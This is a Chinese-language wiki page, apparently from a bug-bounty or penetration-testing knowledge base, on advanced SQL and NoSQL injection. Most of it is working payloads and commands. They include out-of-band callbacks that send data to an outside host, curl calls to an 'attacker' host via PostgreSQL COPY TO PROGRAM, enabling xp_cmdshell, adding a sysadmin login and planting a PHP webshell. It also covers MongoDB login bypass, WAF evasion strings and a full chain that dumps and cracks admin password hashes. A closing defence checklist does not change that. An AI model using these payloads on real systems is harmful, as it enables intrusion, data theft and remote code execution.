---
type: wiki
category: attack
tool: sqlmap,ghauri,manual
status: active
last-updated: 2026-04-21
---

# SQLi 深度攻擊（2026 版）

> **用途：** [29-tool-sqlmap.md](29-tool-sqlmap.md) 教 sqlmap 用法；本文補深度：2nd-order、OOB、NoSQLi (Mongo/Redis/Elastic/GraphQL)、stacked query、time-based blind 調校、各 DB 獨有 trick。

## 0. 為什麼本文存在

```
sqlmap --level=5 --risk=3 跑不出來的情況：
1. 參數進 2nd-order sink（login 後觸發）
2. Blind + 時間抖動大（CDN + queue）→ sqlmap time-based FP
3. NoSQLi（不是 SQL 文法，sqlmap 不認）
4. GraphQL variable 注入
5. WAF 擋 sqlmap 指紋（X-SQLMap / UA）
6. Stacked query 被 ORM 阻斷但能 inline
```

本文幫你 handle 這些情境。

## 1. 2nd-order SQLi（超難被 scanner 找到）

### 1.1 原理

使用者 input A 時被 escape，存進 DB。後續 action B 把 DB 的 row 拿出來，再拼進 SQL → 原本 escape 的 `'` 回復成可 inject 的字元。

```sql
-- Step 1: register
INSERT INTO users (name) VALUES ("admin'--")     -- escape 後存入

-- Step 2: later action
SELECT * FROM logs WHERE user = 'admin'--'       -- 不 escape → 注入
```

### 1.2 測試流程

```bash
# 1. 在 profile 填入 SQLi payload
# 2. 操作會用到這個 profile 的 endpoint（password change / order / search my items / export）
# 3. 看有沒有 error / timing / content 差異

# 常見 2nd-order sink：
- /profile/export
- /orders/my
- /settings/notify
- /admin/users/search (若 admin 查到你)
- /api/logs/me
```

### 1.3 sqlmap 2nd-order

```bash
sqlmap -r request.txt \
  --second-order 'https://target.com/profile/export' \
  --level=5 --risk=3
```

sqlmap 在 `request.txt` 注入後，再打 `--second-order` URL 檢測 response。

## 2. Out-of-band (OOB) SQLi

### 2.1 原理

DB 主動發 DNS / HTTP callback → 繞過 blind 的慢 + WAF（response 不含 payload）。

### 2.2 MSSQL xp_dirtree / xp_fileexist

```sql
'; DECLARE @q varchar(99); SET @q='\\abc123.oast.live\x'; EXEC master..xp_dirtree @q;--
```

### 2.3 Oracle UTL_HTTP

```sql
' || UTL_HTTP.REQUEST('http://abc123.oast.live/'||user) || '
```

### 2.4 MySQL（需 FILE priv + secure_file_priv 未設）

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.oast.live\\x')) -- 
# Windows 上觸發 SMB lookup
```

### 2.5 PostgreSQL

```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://abc123.oast.live/?d='||current_user; --
# 需 superuser
```

### 2.6 sqlmap OOB 模式

```bash
sqlmap -r request.txt --dns-domain=abc123.oast.live --technique=B
# DNS channel（需要你控制 DNS server / 用 interactsh）
```

## 3. Blind 時間校準

### 3.1 時間抖動問題

雲環境 + CDN + DB queue → response time 不穩定，sqlmap 誤判。

### 3.2 手動校準

```bash
# 基準時間
for i in {1..10}; do
  curl -s -w '%{time_total}\n' -o /dev/null \
    "https://target.com/search?q=normal"
done
# 平均 200ms，標準差 50ms

# Inject 7 秒
for i in {1..10}; do
  curl -s -w '%{time_total}\n' -o /dev/null \
    "https://target.com/search?q=';SELECT+pg_sleep(7)--"
done
# 應 >= 7 秒 + baseline，若 ~7.2 秒穩定 → time-based 可用

# sqlmap 調校
sqlmap -u "..." --technique=T --time-sec=10 --threads=1
```

### 3.3 Heavy query 代替 sleep

若 sleep 被 WAF 擋或 DB 無法執行（stored proc 限制）：

```sql
-- MySQL
IF(ASCII(SUBSTR(user(),1,1))=114, BENCHMARK(5000000,MD5('x')), 0)

-- PostgreSQL
CASE WHEN (SELECT count(*) FROM pg_stats)>0 THEN (SELECT pg_sleep(5)) ELSE null END

-- MSSQL
IF (ASCII(SUBSTRING((SELECT @@version),1,1))=77)
  BEGIN SELECT COUNT(*) FROM sys.objects AS a, sys.objects AS b, sys.objects AS c END
```

## 4. Stacked Query

### 4.1 不同 DB 支援度

| DB | Stacked 支援？ |
|----|-----------------|
| MSSQL | ✅ 多數 driver |
| PostgreSQL | ✅ |
| MySQL | ❌ 多數 driver（mysqli 默認關）|
| Oracle | ❌ |
| SQLite | ✅ |

### 4.2 用途

```sql
-- 修改資料（MSSQL / PostgreSQL）
'; UPDATE users SET role='admin' WHERE name='me'--

-- 新增 DB user（MSSQL）
'; EXEC sp_addlogin 'attacker','P@ss'; EXEC sp_addsrvrolemember 'attacker','sysadmin'--

-- RCE（MSSQL xp_cmdshell）
'; EXEC xp_cmdshell 'whoami'--

-- RCE（PostgreSQL COPY TO PROGRAM）
'; COPY cmd TO PROGRAM 'curl attacker/$(id)'--
```

### 4.3 ORM / driver 不支援 stacked 的繞法

用 `;` 不能 → 試 **inline**：

```sql
-- MSSQL
id=1 AND 1=(SELECT 1 WHERE 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END))
-- subquery 執行任意 DML（某些版本）
```

## 5. DB 特性攻擊

### 5.1 MySQL

```sql
-- Version leak
SELECT version();  → 5.7.x / 8.0.x

-- 讀檔
SELECT LOAD_FILE('/etc/passwd');   -- 需 FILE priv
-- 寫檔
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'-- 
-- 需 secure_file_priv= 未設 + 知道 web root + 能寫

-- information_schema enum
UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- MySQL 8 有 sys.* schema：
UNION SELECT * FROM sys.user_summary
```

### 5.2 PostgreSQL

```sql
-- Version
SELECT version();

-- 讀檔（需 superuser）
SELECT pg_read_file('/etc/passwd');
CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';

-- RCE（需 superuser）
COPY cmd_output FROM PROGRAM 'curl attacker/$(id)';
-- 或 CVE-2019-9193 stored proc

-- enum
SELECT datname FROM pg_database;
SELECT schema_name FROM information_schema.schemata;
```

### 5.3 MSSQL

```sql
-- Version
SELECT @@version;

-- xp_cmdshell（需 enable）
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- 讀檔
EXEC xp_fileexist 'C:\Windows\win.ini';
BULK INSERT tmp FROM 'C:\Windows\win.ini';

-- Link server hop（內網 pivot）
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### 5.4 Oracle

```sql
-- Version
SELECT banner FROM v$version;

-- 讀檔（需 CREATE PROCEDURE + UTL_FILE 權限）
-- 多半用 UTL_HTTP OOB

-- enum
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

### 5.5 SQLite

```sql
-- Version
SELECT sqlite_version();

-- enum
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';

-- 無 stacked 時用 UNION

-- Load extension（RCE）- 需 trusted schema
SELECT load_extension('/path/to/ext.so');
```

## 6. NoSQL Injection

### 6.1 MongoDB

**Operator injection**（JSON body）：

```json
// 正常
{"user":"alice","pass":"pw"}

// Attack
{"user":"admin","pass":{"$ne":null}}   // 任何 non-null pass 都過
{"user":"admin","pass":{"$regex":"^a"}}  // brute pass 前綴
{"user":{"$ne":null},"pass":{"$ne":null}}  // 登入第一個 user
```

**字串 context**（`$where`）：

```javascript
// 若 server 用
db.users.find({$where: "this.name=='" + input + "'"})

// Attack
name=';return true;var x='
// → $where: "this.name=='';return true;var x==''"
// 全部回傳
```

### 6.2 sqlmap 不支援 → 用 nosqlmap

```bash
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python nosqlmap.py
# 互動式 menu
```

### 6.3 Redis（經 SSRF）

見 [66-ssrf-deep.md](66-ssrf-deep.md) gopher Redis RCE。

### 6.4 Elasticsearch

```
POST /users/_search
{
  "query": {
    "match": {
      "name": {"query":"alice\" OR 1=1 // ","lenient":true}
    }
  }
}
```

CVE-2014-3120 老版 ES script execution：

```
{"script_fields": {"cmd": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}}
```

### 6.5 GraphQL variable 注入

```graphql
query($id: ID!) {
  user(id: $id) { name }
}

# 正常 variables
{"id": "5"}

# 注入（若 resolver 字串 concat）
{"id": "5' OR '1'='1"}
```

詳見 [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md)。

## 7. WAF Bypass 技巧

### 7.1 Keyword 繞

```sql
-- SELECT 被擋
SeLeCt
SE%00LECT
SEL/**/ECT
SEL/*!SELECT*/ECT          -- MySQL comment
SE+LECT                    -- 部分 parser

-- UNION 被擋
UN/**/ION
UNION%0a
/*!50000UNION*/
```

### 7.2 Space 繞

```sql
UNION(SELECT(1))FROM(users)
UNION/**/SELECT
UNION%09SELECT
UNION%0aSELECT
UNION(SELECT/**/1)
```

### 7.3 Quote 繞

```sql
-- 單引號被擋
CHAR(97,100,109,105,110)    -- 'admin' in MySQL
0x61646d696e                -- hex
UNHEX('61646d696e')
```

### 7.4 Encoding 繞

```
# URL encoding
%27 → '
%2527 → %27 → ' (double encode)

# Unicode
%E2%80%98 → ' (left single quote，某些 parser normalize 成 ')
```

### 7.5 HPP + WAF 繞

見 [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md)。

### 7.6 Tamper scripts（sqlmap）

```bash
sqlmap -u "..." --tamper=space2comment,between,randomcase,charunicodeencode
# 列表
sqlmap --list-tampers
```

## 8. 工具

### 8.1 sqlmap

見 [29-tool-sqlmap.md](29-tool-sqlmap.md)。

### 8.2 Ghauri（sqlmap 替代）

```bash
pip install ghauri
ghauri -u "https://target.com/?id=1" --level=3 --dbs
# 比 sqlmap 快，WAF 繞比較好
```

### 8.3 NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap
```

### 8.4 jSQL Injection（GUI）

```bash
java -jar jsql-injection.jar
```

### 8.5 Burp SQL injection profile（Pro 內建）

Scanner → audit checks → SQL injection。

## 9. 完整 PoC：MySQL time-based blind → admin password hash

### Step 1: 確認注入點

```bash
curl "https://target.com/search?q=x' AND SLEEP(5)-- -"
# 5 秒 → 注入存在

curl "https://target.com/search?q=x' AND SLEEP(5)-- -" -w '%{time_total}'
# 5.2 秒
```

### Step 2: 手動確認 DB version（確 blind 可用）

```bash
for ver in 5 8; do
  T=$(curl -s -o /dev/null -w '%{time_total}' \
    "https://target.com/search?q=x'%20AND%20IF(SUBSTRING(VERSION(),1,1)=$ver,SLEEP(5),0)--%20-")
  echo "ver=$ver time=$T"
done
# ver=8 time=5.1 → MySQL 8.x
```

### Step 3: sqlmap fine-tune

```bash
sqlmap -u "https://target.com/search?q=*" \
  --technique=T --time-sec=5 --level=5 --risk=3 \
  --tamper=space2comment,randomcase \
  --threads=1 \
  --dbs
```

### Step 4: dump admin hash

```bash
sqlmap -u "..." -D app_db -T users -C password_hash,email --where "role='admin'" --dump
```

### Step 5: offline crack

```bash
hashcat -m 0 hash.txt rockyou.txt
# 或 john
```

### Step 6: 報告

```markdown
## 漏洞概述
https://target.com/search?q= 未 parameterize SQL query，允許 time-based
blind SQLi。攻擊者可萃取 admin password hash，離線爆破後取得 admin 帳號。

## PoC
[3 curl：sleep confirm + version detect + hash dump]

## Impact
- 任意 DB 資料外洩（所有 user email/phone/hash）
- 配 password hash → admin ATO
- 若 FILE_PRIV 開 → 讀 /etc/passwd + 寫 webshell → RCE

## Severity
P1 / Critical

## 修補
1. Prepared statement / parameterized query（所有 DB 層）
2. ORM 用 safe API（Sequelize `where: {q}`, Django `filter(q=q)`）
3. WAF 作輔助不作主防
4. DB user 最小權限（應用 DB 用戶禁用 FILE/superuser）
```

## 10. 防禦 checklist

```
1. Prepared statement 強制（driver-level）
2. Stored procedure 也要用 parameterized query
3. ORM 使用方式驗證：不要 rawQuery(user_input)
4. Input validation（type + length + regex），但不依賴
5. DB user 最小 privilege（no FILE, no xp_cmdshell, no pg_read_file）
6. 錯誤訊息不洩漏（Production 關 stack trace）
7. WAF：ModSecurity + OWASP CRS（層 2 防禦）
8. 監控：unusual query pattern / slow query → alert
9. NoSQL：輸入檢查 type（reject object where string expected）
10. Time-based 防禦：請求 timeout / rate limit
```

## 關聯文件

- [29-tool-sqlmap.md](29-tool-sqlmap.md) — sqlmap 完整操作
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL variable injection
- [66-ssrf-deep.md](66-ssrf-deep.md) — SSRF → Redis / 內網 DB
- [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md) — HPP + SQLi WAF bypass
- PortSwigger SQLi：https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings SQLi：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- Ghauri：https://github.com/r0oth3x49/ghauri
